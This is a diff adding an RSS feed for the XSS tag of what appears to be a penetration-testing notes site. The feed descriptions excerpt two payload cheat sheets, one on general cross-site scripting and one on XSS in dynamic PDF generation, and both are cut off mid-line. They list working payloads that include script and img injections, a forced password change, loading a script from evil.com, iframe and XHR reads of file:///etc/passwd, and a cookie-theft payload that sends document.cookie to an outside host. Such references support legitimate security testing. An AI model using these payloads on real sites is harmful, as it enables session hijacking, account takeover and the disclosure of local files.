@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>XSS on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/xss/</link>
+    <description>Recent content in XSS on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 28 Nov 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>XSS (Cross-Site Scripting)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</link>
+      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</guid>
+      <description>Payloads linkWe can insert them into URL params, POST params or HTTP headers.&#xA;Additionary, we can also find CVE related XSS here.&#xA;Script Tags link &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;onerror=alert;throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;{onerror=alert}throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;throw onerror=alert,&amp;#39;hello&amp;#39;,123,&amp;#39;world&amp;#39;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;fetch(&amp;#39;/profile?new_password=password&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; %3Cscript%3Ealert%281%29%3C%2Fscript%3E &amp;#39;;alert(1);&amp;#39; In addition, we may be able to execute our JavaScript file which is hosted on our server.&#xA;&amp;lt;script src=&amp;#34;https://evil.com/evil.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; Img Tags link &amp;#34; src=1 onerror=alert(1)&amp;gt; &amp;lt;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x09;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x0A;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img dynsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img lowsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=http://10.</description>
+    </item>
+    <item>
+      <title>XSS with Dynamic PDF</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</link>
+      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</guid>
+      <description>Basic link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;test&amp;#39;)&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;test&amp;#39;)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt; Path Disclosure link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(JSON.stringify(window.location))&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;&amp;lt;iframe src=\&amp;#34;&amp;#39; &amp;#43; window.location.href &amp;#43; &amp;#39;\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt; LFI/RFI link &amp;lt;iframe src=&amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///var/www/html/index.php width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost:3000/index.html&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost/server-status&amp;#34; height=&amp;#34;1000&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;#34;&amp;gt; LFI/RFI (XHR request) link &amp;lt;script&amp;gt; x = new XMLHttpRequest(); x.onload = function() { document.write(this.responseText) }; x.open(&amp;#34;GET&amp;#34;, &amp;#34;file:///etc/passwd&amp;#34;); x.send(); &amp;lt;/script&amp;gt; Cookie Hijacking link &amp;lt;img src=x onerror=&amp;#34;location.href=&amp;#39;http://10.0.0.1/?cookie=&amp;#39;&amp;#43; document.cookie&amp;#34;&amp;gt; External Scripts link &amp;lt;script src=&amp;#34;http://attacker.</description>
+    </item>
+  </channel>
+</rss>
